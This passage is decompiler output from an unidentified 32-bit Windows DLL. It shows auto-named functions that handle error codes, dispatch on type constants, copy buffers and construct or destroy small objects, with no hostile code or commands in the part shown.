  *(_DWORD *)(a2 + 64) = 0;
  *(_BYTE *)(a2 + 68) = 0;
  *(_DWORD *)(a2 + 69) = 0;
  *(_DWORD *)(a2 + 73) = 0;
  v8 = *(_DWORD **)(a2 + 96);
  *(_DWORD *)(a2 + 56) = v8[10];
  *(_DWORD *)(a2 + 60) = 0;
  *(_BYTE *)(a2 + 64) = 0;
  *(_DWORD *)(a2 + 65) = 0;
  LastError = GetLastError();
  *(_DWORD *)(a2 + 69) = 4;
  *(_DWORD *)(a2 + 73) = LastError;
  if ( sub_1000DE70((int)(v8 + 8), (int)&unk_10186BD0) )
  {
    v11 = (volatile LONG **)sub_100377A6(v10, *(_DWORD *)(a2 + 88), (_DWORD *)(a2 + 48), v8, a2 + 56);
    v12 = *v11;
    *(_DWORD *)(a2 + 69) = *v11;
    *(_DWORD *)(a2 + 73) = v11[1];
    *(_DWORD *)(a2 + 65) = 101;
    goto LABEL_22;
  }
  if ( sub_1000DE70((int)(v8 + 8), (int)&unk_10186B78) )
  {
    *(_DWORD *)(a2 - 4) = 1;
    v14 = *(_DWORD *)(a2 + 88);
    v44 = *(_DWORD *)(v14 + 56);
    v43 = *(volatile LONG ***)(a2 + 104);
    v42 = v13;
    v41 = v13;
    *(_DWORD *)(a2 + 104) = &v41;
    sub_1000D372(&v41, (int)(v8 + 6));
    *(_BYTE *)(a2 - 4) = 2;
    *(_BYTE *)(a2 - 4) = 1;
    sub_10047B57(a2 - 412, (int)v41, (int)v42, v43, v44);
    *(_BYTE *)(a2 - 4) = 3;
    v15 = sub_10047CBA(a2 - 412, (_DWORD *)(a2 - 412), (_DWORD *)(a2 + 48), (_DWORD *)(v14 + 36), (int *)(a2 + 60));
    *(_DWORD *)(a2 + 69) = *v15;
    *(_DWORD *)(a2 + 73) = v15[1];
    *(_BYTE *)(a2 - 4) = 1;
    sub_10036CDB((void *)(a2 - 412));
    *(_DWORD *)(a2 - 4) = 0;
    *(_DWORD *)(a2 + 65) = 109;
    goto LABEL_22;
  }
  if ( sub_1000DE70((int)(v8 + 8), (int)&unk_10186B98) )
  {
    *(_DWORD *)(a2 - 4) = 5;
    v44 = (int)v16;
    v43 = (volatile LONG **)v16;
    *(_DWORD *)(a2 + 104) = &v43;
    sub_1000D372(&v43, (int)(v8 + 6));
    *(_BYTE *)(a2 - 4) = 6;
    v42 = (_DWORD *)a2;
    *(_BYTE *)(a2 - 4) = 5;
    sub_10040CC9(v42, (int)v43, v44);
    *(_BYTE *)(a2 - 4) = 7;
    v17 = sub_10040E1F(a2, (_DWORD *)(a2 + 48), *(_DWORD *)(a2 + 88) + 36, (_DWORD *)(a2 + 60));
    *(_DWORD *)(a2 + 69) = *v17;
    *(_DWORD *)(a2 + 73) = v17[1];
    *(_BYTE *)(a2 - 4) = 5;
    sub_10040DEA((_DWORD *)a2);
    *(_DWORD *)(a2 - 4) = 0;
    *(_DWORD *)(a2 + 65) = 103;
    goto LABEL_22;
  }
  if ( sub_1000DE70((int)(v8 + 8), (int)&unk_10186BC8) || sub_1000DE70((int)(v8 + 8), (int)&unk_10186BA8) )
  {
    *(_DWORD *)(a2 - 4) = 9;
    v44 = *(_DWORD *)(a2 + 100);
    v29 = *(_DWORD *)(a2 + 88);
    sub_10043772(
      (_DWORD *)(a2 - 152),
      (int)(v8 + 6),
      *(_DWORD *)(dword_101842F4 + 214),
      *(void **)(dword_101842F4 + 218),
      *(_DWORD *)(v29 + 56),
      v44);
    *(_BYTE *)(a2 - 4) = 10;
    sub_1000B1F3((void *)(*(_DWORD *)(v29 + 48) - 13), a2 + 24, 0);
    *(_BYTE *)(a2 - 4) = 11;
    v30 = sub_10044274((unsigned int *)(a2 + 24), a2 - 152, (_DWORD *)(a2 + 48));
    *(_DWORD *)(a2 + 69) = *v30;
    *(_DWORD *)(a2 + 73) = v30[1];
    *(_DWORD *)(a2 + 60) = *(_DWORD *)(a2 + 36);
    v31 = (_DWORD *)sub_1000B1F3((void *)0xD, a2 - 36, 0);
    *(_BYTE *)(a2 - 4) = 12;
    v32 = (LONG *)sub_1000B63D(v31, a2 + 4, (_DWORD *)(a2 + 24));
    *(_BYTE *)(a2 - 4) = 13;
    sub_1000B3BD(v32, v29 + 36);
    *(_BYTE *)(a2 - 4) = 12;
    sub_1000B3DF((int *)(a2 + 4));
    *(_BYTE *)(a2 - 4) = 11;
    sub_1000B3DF((int *)(a2 - 36));
    *(_BYTE *)(a2 - 4) = 10;
    sub_1000B3DF((int *)(a2 + 24));
    *(_BYTE *)(a2 - 4) = 9;
    sub_10043A43((int *)(a2 - 152));
    *(_DWORD *)(a2 - 4) = 0;
    *(_DWORD *)(a2 + 65) = 105;
    goto LABEL_21;
  }
  if ( sub_1000DE70((int)(v8 + 8), (int)&unk_10186BD8)
    || sub_1000DE70((int)(v8 + 8), (int)&unk_10186B90)
    || sub_1000DE70((int)(v8 + 8), (int)&unk_10186BC0) )
  {
    if ( sub_1000DE70((int)(v8 + 8), (int)&unk_10186B90)
      || (v24 = sub_1000DE70((int)(v8 + 8), (int)&unk_10186BC0), *(_BYTE *)(a2 + 104) = 0, v24) )
    {
      *(_BYTE *)(a2 + 104) = 1;
    }
    *(_DWORD *)(a2 - 4) = 15;
    v25 = *(_DWORD *)(a2 + 88);
    sub_1000B1F3((void *)(*(_DWORD *)(v25 + 48) - 13), a2 + 24, 0);
    *(_BYTE *)(a2 - 4) = 16;
    sub_10047829((_DWORD *)(a2 - 68), (int)(v8 + 6), *(_DWORD *)(a2 + 36), *(_DWORD *)(a2 + 104));
    *(_BYTE *)(a2 - 4) = 17;
    v26 = sub_10042E9E((_DWORD *)(a2 - 68), (_DWORD *)(a2 + 48), a2 + 24);
    *(_DWORD *)(a2 + 69) = *v26;
    *(_DWORD *)(a2 + 73) = v26[1];
    *(_DWORD *)(a2 + 60) = *(_DWORD *)(a2 + 36);
    v27 = (_DWORD *)sub_1000B1F3((void *)0xD, a2 - 36, 0);
    *(_BYTE *)(a2 - 4) = 18;
    v28 = (LONG *)sub_1000B63D(v27, a2 + 4, (_DWORD *)(a2 + 24));
    *(_BYTE *)(a2 - 4) = 19;
    sub_1000B3BD(v28, v25 + 36);
    *(_BYTE *)(a2 - 4) = 18;
    sub_1000B3DF((int *)(a2 + 4));
    *(_BYTE *)(a2 - 4) = 17;
    sub_1000B3DF((int *)(a2 - 36));
    *(_BYTE *)(a2 - 4) = 16;
    sub_100478C0((int *)(a2 - 68));
    *(_BYTE *)(a2 - 4) = 15;
    sub_1000B3DF((int *)(a2 + 24));
    *(_DWORD *)(a2 - 4) = 0;
    *(_DWORD *)(a2 + 65) = 2 * (*(_BYTE *)(a2 + 104) != 0) + 106;
    goto LABEL_21;
  }
  if ( sub_1000DE70((int)(v8 + 8), (int)&unk_10186B70) )
  {
    *(_DWORD *)(a2 - 4) = 22;
    v18 = *(_DWORD *)(a2 + 88);
    sub_1000B1F3((void *)(*(_DWORD *)(v18 + 48) - 13), a2 + 24, 0);
    *(_BYTE *)(a2 - 4) = 23;
    sub_1004710C((_DWORD *)(a2 - 68), (int)(v8 + 6), *(_DWORD *)(a2 + 36));
    *(_BYTE *)(a2 - 4) = 24;
    v19 = sub_10042E9E((_DWORD *)(a2 - 68), (_DWORD *)(a2 + 48), a2 + 24);
    *(_DWORD *)(a2 + 69) = *v19;
    *(_DWORD *)(a2 + 73) = v19[1];
    *(_DWORD *)(a2 + 60) = *(_DWORD *)(a2 + 36);
    v20 = (_DWORD *)sub_1000B1F3((void *)0xD, a2 + 4, 0);
    *(_BYTE *)(a2 - 4) = 25;
    v21 = (LONG *)sub_1000B63D(v20, a2 - 36, (_DWORD *)(a2 + 24));
    *(_BYTE *)(a2 - 4) = 26;
    sub_1000B3BD(v21, v18 + 36);
    *(_BYTE *)(a2 - 4) = 25;
    sub_1000B3DF((int *)(a2 - 36));
    *(_BYTE *)(a2 - 4) = 24;
    sub_1000B3DF((int *)(a2 + 4));
    *(_BYTE *)(a2 - 4) = 23;
    sub_100471E5((int *)(a2 - 68));
    *(_BYTE *)(a2 - 4) = 22;
    sub_1000B3DF((int *)(a2 + 24));
    *(_DWORD *)(a2 - 4) = 0;
    *(_DWORD *)(a2 + 65) = 107;
LABEL_21:
    v8 = *(_DWORD **)(a2 + 96);
    goto LABEL_22;
  }
  v22 = sub_1002FC83(*(_DWORD *)(a2 + 88) + 20, (int)(v8 + 8));
  v12 = (volatile LONG *)v44;
  if ( !v22 )
  {
    v23 = (volatile LONG **)sub_10037952((volatile LONG *)v44, *(_DWORD *)(a2 + 88), (_DWORD *)(a2 + 48), v8, a2 + 56);
    v12 = *v23;
    *(_DWORD *)(a2 + 69) = *v23;
    *(_DWORD *)(a2 + 73) = v23[1];
    *(_DWORD *)(a2 + 65) = 102;
  }
LABEL_22:
  if ( *(_DWORD *)(a2 + 69) )
  {
    v33 = sub_1002FC83(*(_DWORD *)(a2 + 88) + 20, (int)(v8 + 8));
    v12 = (volatile LONG *)v44;
    if ( v33 )
    {
      if ( *(_DWORD *)(a2 + 65) && *(_BYTE *)(a2 + 100) )
      {
        v43 = (volatile LONG **)v44;
        *(_DWORD *)(a2 + 96) = &v43;
        sub_1000728E(&v43, 0);
        *(_DWORD *)(a2 - 4) = 29;
        v42 = *(_DWORD **)(a2 + 73);
        v41 = *(_DWORD **)(a2 + 69);
        *(_BYTE *)(a2 - 4) = 0;
        sub_1004F618((_DWORD *)dword_10182DE8, 211, (int)(v8 + 6), (char)v41, (char)v42, (int)v43, v44);
      }
      v34 = *(_DWORD *)(a2 + 108);
      if ( v34
        && sub_1000DE70((int)&unk_10186BB8, v34 + 608)
        && (*(_DWORD *)(v34 + 28) || *(_DWORD *)(v34 + 32) > 0x180000u) )
      {
        v35 = GetLastError();
        *(_DWORD *)(a2 + 69) = 117;
        *(_DWORD *)(a2 + 73) = v35;
        if ( *(_BYTE *)(a2 + 100) )
        {
          v44 = (int)v12;
          v43 = (volatile LONG **)v12;
          *(_DWORD *)(a2 + 96) = &v43;
          sub_1000728E(&v43, 0);
          *(_DWORD *)(a2 - 4) = 30;
          v42 = *(_DWORD **)(v34 + 32);
          v41 = *(_DWORD **)(v34 + 28);
          *(_BYTE *)(a2 - 4) = 0;
          sub_1004F618((_DWORD *)dword_10182DE8, 15, v34 + 600, (char)v41, (char)v42, (int)v43, v44);
        }
      }
      else
      {
        v36 = sub_10037670((int *)(a2 + 48), *(_DWORD **)(a2 + 88), v8, a2 + 56);
        v12 = (volatile LONG *)*v36;
        *(_DWORD *)(a2 + 69) = *v36;
        *(_DWORD *)(a2 + 73) = v36[1];
      }
      *(_DWORD *)(a2 + 65) = 100;
    }
  }
  if ( *(_DWORD *)(a2 + 73) == 2
    || *(_DWORD *)(a2 + 73) == 205
    || (v37 = *(_DWORD *)(a2 + 73) == 5, *(_BYTE *)(a2 + 64) = 0, v37) )
  {
    *(_BYTE *)(a2 + 64) = 1;
  }
  if ( *(_DWORD *)(a2 + 69) || !*(_DWORD *)(a2 + 60) )
  {
    if ( *(_BYTE *)(a2 + 100) )
    {
      v44 = (int)v12;
      v43 = (volatile LONG **)v12;
      *(_DWORD *)(a2 + 88) = &v43;
      sub_1000728E(&v43, 0);
      *(_DWORD *)(a2 - 4) = 31;
      v42 = *(_DWORD **)(a2 + 73);
      v41 = *(_DWORD **)(a2 + 69);
      *(_BYTE *)(a2 - 4) = 0;
      sub_1004F618((_DWORD *)dword_10182DE8, 210, (int)(v8 + 6), (char)v41, (char)v42, (int)v43, v44);
    }
    *(_DWORD *)(a2 + 60) = 0;
    if ( *(_BYTE *)(a2 + 100) )
      sub_1000B1F3((void *)0x15, *(_DWORD *)(a2 + 92), (void *)(a2 + 56));
    else
      sub_1000B1F3(0, *(_DWORD *)(a2 + 92), 0);
  }
  else
  {
    v38 = *(_DWORD *)(a2 + 88);
    v44 = 13;
    v43 = (volatile LONG **)(a2 + 56);
    v39 = (void *)sub_1000B49B((_DWORD *)(v38 + 36), (int)v12);
    memcpy(v39, v43, v44);
    *(_BYTE *)(*(_DWORD *)(v38 + 40) + 8) = 1;
    sub_1000B6B7((_DWORD *)(v38 + 36), *(_DWORD *)(a2 + 92), 0, *(_DWORD *)(a2 + 60) + 13);
  }
  *(_DWORD *)(a2 - 4) = 0;
  *(_DWORD *)(a2 + 44) = 1;
  return *(_DWORD *)(a2 + 92);
}
// 10036EDB: variable 'v10' is possibly undefined
// 10036F1E: variable 'v13' is possibly undefined
// 10036FC2: variable 'v16' is possibly undefined
// 1003751E: variable 'v12' is possibly undefined
// 10182DE8: using guessed type int dword_10182DE8;
// 101842F4: using guessed type int dword_101842F4;

//----- (10037670) --------------------------------------------------------
int *__userpurge sub_10037670@<eax>(int *a1@<ebx>, _DWORD *a2, _DWORD *a3, int a4)
{
  bool v4; // zf
  int *v5; // eax
  int v6; // ecx
  int v7; // eax
  int *v8; // eax
  int v9; // ecx
  int v10; // eax
  int v11; // edi
  int v13; // [esp-4h] [ebp-50h]
  char v14; // [esp+Ch] [ebp-40h]
  unsigned int *v15[2]; // [esp+10h] [ebp-3Ch] BYREF
  int v16; // [esp+18h] [ebp-34h] BYREF
  int v17[2]; // [esp+20h] [ebp-2Ch] BYREF
  char v18; // [esp+28h] [ebp-24h]
  int v19; // [esp+30h] [ebp-1Ch]
  int v20; // [esp+34h] [ebp-18h]
  int v21; // [esp+38h] [ebp-14h] BYREF
  int v22; // [esp+48h] [ebp-4h]

  v17[0] = (int)off_101040F4;
  v17[1] = 0;
  v18 = 0;
  v19 = 0;
  v20 = 0;
  v15[0] = (unsigned int *)&v21;
  v21 = 0;
  v22 = 6;
  v4 = *a3 == 0;
  *a1 = 0;
  a1[1] = 0;
  if ( v4 )
    v5 = sub_1004767A((int *)v15, (int)v17, (int)(a3 + 6));
  else
    v5 = sub_100476E1((int)v17, (int *)v15);
  v6 = *v5;
  v4 = *v5 == 0;
  a1[1] = v5[1];
  *a1 = v6;
  if ( v4 )
  {
    *(_DWORD *)(a4 + 4) = (unsigned int)(a2[12] - 13) >> 1;
    v15[0] = (unsigned int *)(a4 + 4);
    v14 = sub_1002FC83((int)(a2 + 1), (int)(a3 + 8));
    v7 = sub_1000B49B(a2 + 9, v13);
    v8 = sub_1004777B(v7 + 13, v15[0], (int)v17, &v16, v14);
    v9 = *v8;
    v10 = v8[1];
    v11 = a2[10];
    *a1 = v9;
    a1[1] = v10;
    *(_BYTE *)(v11 + 8) = 1;
  }
  v22 = -1;
  sub_10047482(v17);
  return a1;
}
// 10037756: variable 'v13' is possibly undefined
// 101040F4: using guessed type int (__thiscall *off_101040F4[2])(void *Block, char);

//----- (100377A6) --------------------------------------------------------
_DWORD *__fastcall sub_100377A6(int a1, int a2, _DWORD *a3, _DWORD *a4, int a5)
{
  _DWORD *v5; // eax
  WCHAR *v6; // edi
  int v7; // edx
  int v8; // eax
  _DWORD *v10; // [esp-4h] [ebp-28h]

  v5 = a4;
  v6 = 0;
  if ( !*a4 )
    v6 = *(WCHAR **)(a4[7] + 12);
  a4 = (_DWORD *)(*(_DWORD *)(a2 + 48) - 13);
  sub_1000B4B8(v5 + 1);
  v10 = (_DWORD *)(a5 + 4);
  sub_1000B4B8((_DWORD *)(v7 + 36));
  v8 = sub_1008ACB0(v6, (int *)&a4, v10);
  if ( v8 )
  {
    if ( v8 != -536870887 )
    {
      *a3 = 115;
      a3[1] = v8;
      return a3;
    }
    a3[1] = 2;
  }
  else
  {
    a3[1] = 0;
  }
  *a3 = 0;
  return a3;
}
// 100377E5: variable 'v7' is possibly undefined

//----- (10037855) --------------------------------------------------------
_DWORD *__thiscall sub_10037855(void *this, int a2, _DWORD *a3, int a4)
{
  unsigned int v5; // esi
  void *v6; // ebx
  int v7; // ecx
  _DWORD *v8; // esi
  LONG *v9; // eax
  int v10; // eax
  int v12[5]; // [esp+10h] [ebp-50h] BYREF
  int v13[5]; // [esp+24h] [ebp-3Ch] BYREF
  int v14[5]; // [esp+38h] [ebp-28h] BYREF
  void *v15; // [esp+4Ch] [ebp-14h]
  char v16; // [esp+53h] [ebp-Dh]
  int v17; // [esp+5Ch] [ebp-4h]

  v5 = *(_DWORD *)(a2 + 48) - 13;
  v16 = 0;
  sub_1000B1F3((void *)0xD, (int)v13, 0);
  v17 = 0;
  v6 = *(void **)(dword_101842F4 + 178);
  if ( (*(int (__thiscall **)(void *))(*(_DWORD *)this + 120))(this) < (unsigned int)v6 )
    v6 = (void *)(*(int (__thiscall **)(void *))(*(_DWORD *)this + 120))(this);
  if ( v5 < (unsigned int)v6 )
  {
    v6 = (void *)v5;
    v16 = 1;
  }
  sub_1000B1F3(v6, (int)v14, 0);
  LOBYTE(v17) = 1;
  sub_1000B79B(v7, v14);
  v15 = (void *)(*(int (__thiscall **)(void *, int *))(*(_DWORD *)this + 48))(this, v14);
  if ( v6 == v15 )
  {
    v9 = (LONG *)sub_1000B63D(v13, (int)v12, v14);
    LOBYTE(v17) = 2;
    sub_1000B3BD(v9, a2 + 36);
    LOBYTE(v17) = 1;
    sub_1000B3DF(v12);
    v8 = a3;
    *(_DWORD *)(a4 + 4) = v15;
    v10 = v16 != 0 ? 2 : 0;
    *a3 = 0;
    a3[1] = v10;
  }
  else
  {
    v8 = a3;
    *a3 = 116;
    a3[1] = 5006;
  }
  LOBYTE(v17) = 0;
  sub_1000B3DF(v14);
  v17 = -1;
  sub_1000B3DF(v13);
  return v8;
}
// 100378BD: variable 'v7' is possibly undefined
// 101842F4: using guessed type int dword_101842F4;
// 10037855: using guessed type int var_3C[5];
// 10037855: using guessed type int var_28[5];
// 10037855: using guessed type int var_50[5];

//----- (10037952) --------------------------------------------------------
_DWORD *__thiscall sub_10037952(volatile LONG *this, int a2, _DWORD *a3, _DWORD *a4, int a5)
{
  volatile LONG *v6; // [esp-8h] [ebp-A4h] BYREF
  volatile LONG *v7; // [esp-4h] [ebp-A0h]
  int v8[31]; // [esp+10h] [ebp-8Ch] BYREF
  int v9; // [esp+98h] [ebp-4h]

  if ( *a4 == 1 )
  {
    *a3 = 0;
    a3[1] = 0;
  }
  else
  {
    v7 = this;
    v6 = this;
    v8[30] = (int)&v6;
    sub_1000B964(&v6);
    v9 = -1;
    sub_1001F586((int)v8, (int)(a4 + 6), (int)v6, v7);
    v9 = 2;
    sub_1001F651((int)v8);
    v9 = 1;
    sub_10037855(v8, a2, a3, a5);
    v9 = -1;
    sub_1001F600((HANDLE *)v8);
  }
  return a3;
}

//----- (10037ACA) --------------------------------------------------------
_DWORD *__thiscall sub_10037ACA(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // esi

  v3 = operator new(0x1Cu);
  v4 = (int)v3;
  if ( v3 )
  {
    v3[1] = this;
    *v3 = &off_10103A50;
    sub_10008066(v3 + 2);
    *(_DWORD *)(v4 + 24) = 0;
  }
  else
  {
    v4 = 0;
  }
  sub_10039112(a2, v4);
  return a2;
}
// 10103A50: using guessed type int (__stdcall *off_10103A50)(char);

//----- (10037B31) --------------------------------------------------------
_DWORD *__thiscall sub_10037B31(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // edi
  _DWORD *v5; // eax
  _DWORD *v6; // ecx
  _DWORD *result; // eax

  v3 = operator new(0x2Cu);
  if ( v3 )
    v4 = sub_10037D60(v3, (int)this);
  else
    v4 = 0;
  v5 = operator new(4u);
  if ( v5 )
  {
    *v5 = 1;
    v6 = v5;
  }
  else
  {
    v6 = 0;
  }
  result = a2;
  a2[1] = v6;
  *a2 = v4;
  return result;
}

//----- (10037BA2) --------------------------------------------------------
_DWORD *__thiscall sub_10037BA2(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // edi
  _DWORD *v5; // eax
  _DWORD *v6; // ecx
  _DWORD *result; // eax

  v3 = operator new(0x20u);
  if ( v3 )
    v4 = sub_10037F2C(v3, (int)this);
  else
    v4 = 0;
  v5 = operator new(4u);
  if ( v5 )
  {
    *v5 = 1;
    v6 = v5;
  }
  else
  {
    v6 = 0;
  }
  result = a2;
  a2[1] = v6;
  *a2 = v4;
  return result;
}

//----- (10037C13) --------------------------------------------------------
int __thiscall sub_10037C13(int this, int a2)
{
  sub_10056FB7((void *)(this + 20), a2);
  return a2;
}

//----- (10037C44) --------------------------------------------------------
_DWORD *__thiscall sub_10037C44(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // esi
  _DWORD *v5; // eax
  _DWORD *v6; // ecx
  _DWORD *result; // eax

  v3 = operator new(0x18u);
  if ( v3 )
  {
    v3[1] = this;
    *v3 = &off_10103AD0;
    v3[2] = off_10103CC0;
    v3[5] = 0;
    v4 = v3;
  }
  else
  {
    v4 = 0;
  }
  v5 = operator new(4u);
  if ( v5 )
  {
    *v5 = 1;
    v6 = v5;
  }
  else
  {
    v6 = 0;
  }
  result = a2;
  a2[1] = v6;
  *a2 = v4;
  return result;
}
// 10103AD0: using guessed type int (__stdcall *off_10103AD0)(char);
// 10103CC0: using guessed type int (__thiscall *off_10103CC0[2])(void *Block, char);

//----- (10037CC9) --------------------------------------------------------
void __thiscall sub_10037CC9(int *this)
{
  *this = (int)&off_10103A4C;
  sub_1000D3AD(this + 1);
}
// 10103A4C: using guessed type int (__thiscall *off_10103A4C)(void *, char);

//----- (10037CF0) --------------------------------------------------------
int __thiscall sub_10037CF0(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 8))(this, a2);
  return a2;
}

//----- (10037D1E) --------------------------------------------------------
BOOL __thiscall sub_10037D1E(_DWORD *this)
{
  return this[6] != 0;
}

//----- (10037D28) --------------------------------------------------------
LONG *__thiscall sub_10037D28(LONG *this)
{
  int v2; // eax

  v2 = (*(int (__thiscall **)(int, LONG))(*(_DWORD *)(this[1] + 4) + 44))(this[1] + 4, this[6]);
  sub_10001236((LONG *)(v2 + 4), this + 4);
  this[5] = *(_DWORD *)(*(int (__thiscall **)(int, LONG))(*(_DWORD *)(this[1] + 20) + 44))(this[1] + 20, this[6]);
  return this + 2;
}

//----- (10037D5C) --------------------------------------------------------
void __thiscall sub_10037D5C(_DWORD *this)
{
  --this[6];
}

//----- (10037D60) --------------------------------------------------------
_DWORD *__stdcall sub_10037D60(_DWORD *a1, int a2)
{
  a1[1] = a2;
  *a1 = &off_10103A70;
  a1[2] = &off_10103910;
  sub_1000D17D(a1 + 3, (wchar_t *)&word_10102960);
  sub_10038185(a1 + 5);
  a1[10] = 0;
  return a1;
}
// 10103910: using guessed type int (__thiscall *off_10103910)(void *Block, char);
// 10103A70: using guessed type int (__stdcall *off_10103A70)(char);

//----- (10037DBA) --------------------------------------------------------
int __thiscall sub_10037DBA(int this)
{
  int v2; // eax
  int v3; // eax

  v2 = (*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(*(_DWORD *)(this + 4) + 4) + 44))(
         *(_DWORD *)(this + 4) + 4,
         *(_DWORD *)(this + 40));
  sub_10001236((LONG *)(v2 + 4), (LONG *)(this + 16));
  v3 = (*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(*(_DWORD *)(this + 4) + 20) + 44))(
         *(_DWORD *)(this + 4) + 20,
         *(_DWORD *)(this + 40));
  sub_100381A7(v3, (_BYTE *)(this + 20));
  return this + 8;
}

//----- (10037DF7) --------------------------------------------------------
void __thiscall sub_10037DF7(_DWORD *this)
{
  ++this[10];
}

//----- (10037DFB) --------------------------------------------------------
void __thiscall sub_10037DFB(int *this)
{
  *this = (int)&off_10103910;
  sub_100380FA(this + 3);
  sub_1000D3AD(this + 1);
}
// 10103910: using guessed type int (__thiscall *off_10103910)(void *Block, char);

//----- (10037E30) --------------------------------------------------------
int __thiscall sub_10037E30(int this)
{
  int v2; // edi
  _DWORD *v3; // eax
  _DWORD v5[4]; // [esp+10h] [ebp-10h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    v3 = sub_1000E8EF(v5);
    v5[3] = 0;
    sub_100078FE((int)v3);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (10037E74) --------------------------------------------------------
int __thiscall sub_10037E74(int this)
{
  int v2; // edi
  int result; // eax
  _DWORD *v4; // eax
  _DWORD v5[4]; // [esp+10h] [ebp-10h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    v4 = sub_1000E8EF(v5);
    v5[3] = 0;
    sub_100078FE((int)v4);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (10037EB3) --------------------------------------------------------
int __thiscall sub_10037EB3(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int result; // eax
  _DWORD v4[4]; // [esp+10h] [ebp-10h] BYREF

  v1 = this[2];
  if ( !v1 )
  {
    v2 = sub_1000E8EF(v4);
    v4[3] = 0;
    sub_100078FE((int)v2);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (10037EE8) --------------------------------------------------------
int __thiscall sub_10037EE8(int this)
{
  int v2; // edi
  _DWORD *v3; // eax
  _DWORD v5[4]; // [esp+10h] [ebp-10h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    v3 = sub_1000E8EF(v5);
    v5[3] = 0;
    sub_100078FE((int)v3);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (10037F2C) --------------------------------------------------------
_DWORD *__stdcall sub_10037F2C(_DWORD *a1, int a2)
{
  a1[1] = a2;
  *a1 = &off_10103AB0;
  a1[2] = off_101039B0;
  sub_1000D17D(a1 + 3, (wchar_t *)&word_10102960);
  sub_1000D17D(a1 + 5, (wchar_t *)&word_10102960);
  a1[7] = 0;
  return a1;
}
// 101039B0: using guessed type int (__thiscall *off_101039B0[2])(void *Block, char);
// 10103AB0: using guessed type int (__stdcall *off_10103AB0)(char);

//----- (10037F89) --------------------------------------------------------
BOOL __thiscall sub_10037F89(_DWORD *this)
{
  return this[7] != 0;
}

//----- (10037F93) --------------------------------------------------------
LONG *__thiscall sub_10037F93(LONG *this)
{
  int v2; // eax
  int v3; // eax

  v2 = (*(int (__thiscall **)(int, LONG))(*(_DWORD *)(this[1] + 4) + 44))(this[1] + 4, this[7]);
  sub_10001236((LONG *)(v2 + 4), this + 4);
  v3 = (*(int (__thiscall **)(int, LONG))(*(_DWORD *)(this[1] + 20) + 44))(this[1] + 20, this[7]);
  sub_10001236((LONG *)(v3 + 4), this + 6);
  return this + 2;
}

//----- (10037FCD) --------------------------------------------------------
void __thiscall sub_10037FCD(_DWORD *this)
{
  ++this[7];
}

//----- (10037FD1) --------------------------------------------------------
void __thiscall sub_10037FD1(int *this)
{
  *this = (int)off_101039B0;
  sub_1000D3AD(this + 3);
  sub_1000D3AD(this + 1);
}
// 101039B0: using guessed type int (__thiscall *off_101039B0[2])(void *Block, char);

//----- (10038006) --------------------------------------------------------
BOOL __thiscall sub_10038006(int this)
{
  return *(_DWORD *)(this + 20) >= (unsigned int)(*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (10038019) --------------------------------------------------------
BOOL __thiscall sub_10038019(_DWORD *this)
{
  return this[5] != 0;
}

//----- (10038023) --------------------------------------------------------
int __thiscall sub_10038023(int this)
{
  _BYTE *v2; // eax
  int v4; // [esp-4h] [ebp-8h]

  v2 = (_BYTE *)(*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(*(_DWORD *)(this + 4) + 4) + 44))(
                  *(_DWORD *)(this + 4) + 4,
                  *(_DWORD *)(this + 20));
  v4 = *(_DWORD *)(this + 20);
  *(_BYTE *)(this + 12) = *v2;
  *(_DWORD *)(this + 16) = *(_DWORD *)(*(int (__thiscall **)(int, int))(*(_DWORD *)(*(_DWORD *)(this + 4) + 20) + 44))(
                                        *(_DWORD *)(this + 4) + 20,
                                        v4);
  return this + 8;
}

//----- (10038051) --------------------------------------------------------
void __noreturn sub_10038051()
{
  int v0; // eax
  char v1[16]; // [esp+10h] [ebp-14h] BYREF
  int v2; // [esp+20h] [ebp-4h]

  v0 = sub_1000E950((int)v1);
  v2 = 0;
  sub_10007DD5(v0, 165);
}
// 10038051: using guessed type char var_14[16];

//----- (10038076) --------------------------------------------------------
int *__thiscall sub_10038076(int *this, char a2)
{
  sub_1000522C(this + 2);
  if ( (a2 & 1) != 0 )
    j__free(this);
  return this;
}

//----- (100380AA) --------------------------------------------------------
int *__thiscall sub_100380AA(int *this, char a2)
{
  sub_10037DFB(this + 2);
  if ( (a2 & 1) != 0 )
    j__free(this);
  return this;
}

//----- (100380DE) --------------------------------------------------------
int *__thiscall sub_100380DE(int *Block, char a2)
{
  sub_10037DFB(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100380FA) --------------------------------------------------------
void __thiscall sub_100380FA(_DWORD *this)
{
  sub_10032EA8(this);
}

//----- (10038135) --------------------------------------------------------
int *__thiscall sub_10038135(int *this, char a2)
{
  sub_10037FD1(this + 2);
  if ( (a2 & 1) != 0 )
    j__free(this);
  return this;
}

//----- (10038169) --------------------------------------------------------
int *__thiscall sub_10038169(int *Block, char a2)
{
  sub_10037FD1(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10038185) --------------------------------------------------------
